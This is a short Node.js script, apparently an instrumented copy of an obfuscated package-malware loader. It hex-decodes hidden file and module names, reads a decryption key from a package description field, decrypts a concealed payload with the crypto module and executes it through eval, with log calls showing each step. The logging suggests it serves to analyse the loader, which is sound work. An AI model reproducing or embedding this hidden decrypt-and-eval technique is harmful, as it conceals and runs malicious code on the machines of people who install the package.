var {log} = require('./helper');

function debuffer(str) {
  return Buffer.from(str, "hex").toString();
}

var file = debuffer("2e2f746573742f646174612e6a73");
log("file name: %s", file);

var bufData = require(file);
log("buf data: %j", bufData);

var data = [];
bufData.forEach((item, idx) => {
  var debufData = debuffer(item);
  log("debuf data[%s]: %s", idx, debufData);
  data[idx] = debufData;
});
log("debuf data %j", data);

var {description: key} = require(data[6]);
log('cypher key %s', key);

function decipher(bufData, key) {
  var crypto = require(data[0])[data[1]](data[3], key);
  var sourceData = crypto.update(bufData, data[5], data[4]);
  sourceData += crypto.final(data[4]);
  return sourceData;
}

var source = decipher(data[7], key);
var code = eval(source);
code();


